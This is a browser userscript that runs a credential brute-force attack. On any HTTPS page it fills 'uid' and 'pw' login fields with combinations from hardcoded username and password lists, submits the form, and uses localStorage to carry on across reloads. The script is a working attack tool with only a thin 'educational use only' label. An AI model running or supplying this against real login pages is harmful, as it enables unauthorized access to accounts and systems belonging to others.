// ==UserScript==
// @name         bruteforce with localStorage
// @namespace    http://tampermonkey.net/
// @version      2025-05-12
// @description  Bruteforce with persistent counters using localStorage (for educational use only)
// @author       You
// @match        https://*/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const username = ['anurag', 'kevel', 'purv', 'ayush', 'temp', 'admin', 'test', 'test123', 'mytest', 'abcdefg'];
    const password = ['anurag', 'kevel', 'purv', 'ayush', 'temp', 'admin', 'test', 'test123', 'mytest', 'abcdefg'];


    let i = parseInt(localStorage.getItem('bruteforce_i')) || 0;
    let j = parseInt(localStorage.getItem('bruteforce_j')) || 0;

    const interval = setTimeout(() => {
        const userInput = document.querySelector("input[name='uid']");
        const passInput = document.querySelector("input[name='pw']");
        const button = document.querySelector("input[type='submit']");

        if (!userInput || !passInput || !button) {
            console.log("Form elements not found.");
            return;
        }

        userInput.value = username[i];
        passInput.value = password[j];
        console.log(`Trying: ${username[i]} / ${password[j]}`);


       

        button.click();

        // Update counters for next attempt
        j++;
        if (j >= password.length) {
            j = 0;
            i++;
        }

        // Save updated counters
        localStorage.setItem('bruteforce_i', i);
        localStorage.setItem('bruteforce_j', j);

        // Stop if all combinations tried
        if (i >= username.length) {
            localStorage.removeItem('bruteforce_i');
            localStorage.removeItem('bruteforce_j');
            console.log("All combinations tried.");
        }
    }, 50);

})();
